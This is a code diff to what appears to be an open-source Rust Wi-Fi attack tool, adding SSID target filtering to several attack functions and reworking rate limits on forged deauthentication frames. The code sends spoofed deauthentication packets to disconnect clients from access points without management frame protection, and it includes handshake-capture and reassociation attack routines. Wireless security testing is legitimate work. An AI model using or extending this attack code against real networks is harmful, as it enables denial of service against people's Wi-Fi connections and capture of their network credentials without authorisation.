@@ -45,6 +45,13 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
         return Ok(());
     };
 
+    if !oxide.stargets.is_empty()
+        && ap_data.ssid.is_some()
+        && !oxide.stargets.contains(&ap_data.ssid.clone().unwrap())
+    {
+        return Ok(());
+    }
+
     if ap_data.ssid.is_none() {
         return Ok(());
     }
@@ -105,6 +112,13 @@ pub fn m1_retrieval_attack_phase_2(
     } else {
         return Ok(());
     };
+
+    if !oxide.stargets.is_empty()
+        && ap_data.ssid.is_some()
+        && !oxide.stargets.contains(&ap_data.ssid.clone().unwrap())
+    {
+        return Ok(());
+    }
 
     // Is our sequence state 1?
     if ap_data.auth_sequence.state != 1 {
@@ -179,6 +193,13 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
         return Ok(());
     };
 
+    if !oxide.stargets.is_empty()
+        && ap_data.ssid.is_some()
+        && !oxide.stargets.contains(&ap_data.ssid.clone().unwrap())
+    {
+        return Ok(());
+    }
+
     if oxide.notx {
         return Ok(());
     }
@@ -186,55 +207,58 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
     let beacon_count = ap_data.beacon_count;
     let mut deauth_client = MacAddress([255, 255, 255, 255, 255, 255]);
 
-    if (beacon_count % 32) == 0
-        && !ap_data.information.ap_mfp.is_some_and(|mfp| mfp)
-        && ap_data.information.akm_mask()
-    {
+    if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
         let random_client = ap_data
             .client_list
             .get_random()
             .map(|client| client.mac_address);
 
         if let Some(mac_address) = random_client {
-            deauth_client = mac_address;
-            // Deauth From AP
-            let frx = build_deauthentication_fm_ap(
-                ap_mac,
-                &mac_address,
-                oxide.counters.sequence1(),
-                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
-            );
-            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            // Rate limit directed deauths to every 32 beacons.
+            if (beacon_count % 32) == 0 {
+                deauth_client = mac_address;
+                // Deauth From AP
+                let frx = build_deauthentication_fm_ap(
+                    ap_mac,
+                    &mac_address,
+                    oxide.counters.sequence1(),
+                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+                );
+                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
 
-            // Deauth From Client
-            let frx = build_deauthentication_fm_client(
-                ap_mac,
-                &mac_address,
-                oxide.counters.sequence1(),
-                DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
-            );
-            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+                // Deauth From Client
+                let frx = build_deauthentication_fm_client(
+                    ap_mac,
+                    &mac_address,
+                    oxide.counters.sequence1(),
+                    DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
+                );
+                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
 
-            ap_data.interactions += 1;
-            oxide.status_log.add_message(StatusMessage::new(
-                MessageType::Info,
-                format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
-            ));
+                ap_data.interactions += 1;
+                oxide.status_log.add_message(StatusMessage::new(
+                    MessageType::Info,
+                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
+                ));
+            }
         } else {
-            // There is no client
-            let frx = build_deauthentication_fm_ap(
-                ap_mac,
-                &MacAddress([255, 255, 255, 255, 255, 255]),
-                oxide.counters.sequence1(),
-                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
-            );
-            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            // Rate limit broadcast deauths to every 128 beacons.
+            if (beacon_count % 128) == 0 {
+                // There is no client
+                let frx = build_deauthentication_fm_ap(
+                    ap_mac,
+                    &MacAddress([255, 255, 255, 255, 255, 255]),
+                    oxide.counters.sequence1(),
+                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+                );
+                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
 
-            ap_data.interactions += 1;
-            oxide.status_log.add_message(StatusMessage::new(
-                MessageType::Info,
-                format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
-            ));
+                ap_data.interactions += 1;
+                oxide.status_log.add_message(StatusMessage::new(
+                    MessageType::Info,
+                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
+                ));
+            }
         }
     }
 
@@ -272,6 +296,13 @@ pub fn anon_reassociation_attack(
     } else {
         return Ok(());
     };
+
+    if !oxide.stargets.is_empty()
+        && ap.ssid.is_some()
+        && !oxide.stargets.contains(&ap.ssid.clone().unwrap())
+    {
+        return Ok(());
+    }
 
     let pcs = if ap.information.cs_ccmp.is_some_and(|x| x) {
         RsnCipherSuite::CCMP
@@ -403,6 +434,7 @@ pub fn rogue_m2_attack_undirected(
         return Ok(());
     };
 
+    // Dont over-transmit
     if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
         return Ok(());
     }
